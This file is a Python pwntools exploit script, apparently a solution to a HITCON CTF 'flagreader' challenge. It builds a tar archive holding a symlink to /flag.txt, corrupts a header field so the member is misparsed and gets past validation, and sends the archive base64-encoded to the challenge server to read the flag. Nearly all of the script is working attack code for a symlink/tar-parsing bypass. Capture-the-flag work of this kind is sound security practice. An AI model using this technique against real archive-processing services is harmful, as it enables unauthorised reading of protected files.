from base64 import b64encode
from io import BytesIO
from pwn import *
import os
import tarfile

def break_tar():
    with open('exploit.tar', 'rb') as f:
        tardata = bytearray(f.read())
    pos = 0
    for _ in range(4):
        pos = tardata.find(b'0000000\x00', pos + 1)
    tardata[pos:pos+8] = b'\x81aA-'+b'\x00'*4
    with open('exploit.tar', 'wb') as f:
        f.write(tardata)

with tarfile.open('exploit.tar', 'w') as tar:
    for name, data in ('foo', b'123'), ('bar', b'456'):
        ti = tarfile.TarInfo()
        ti.size = 3
        ti.name = name
        tar.addfile(ti, BytesIO(data))

    os.symlink('/flag.txt', 'flag.txt')
    tar.add('flag.txt')
    os.remove('flag.txt')

break_tar()

with tarfile.open('exploit.tar', 'r:') as tar:
    for member in tar.getmembers():
        print(member.name, member.isfile())

with open('exploit.tar', 'rb') as f:
    tardata = f.read()

# io = remote('0.0.0.0', 22222)
io = remote('flagreader.chal.hitconctf.com', 22222)
io.sendlineafter(b'Enter a base64 encoded tar: ', b64encode(tardata))
io.interactive()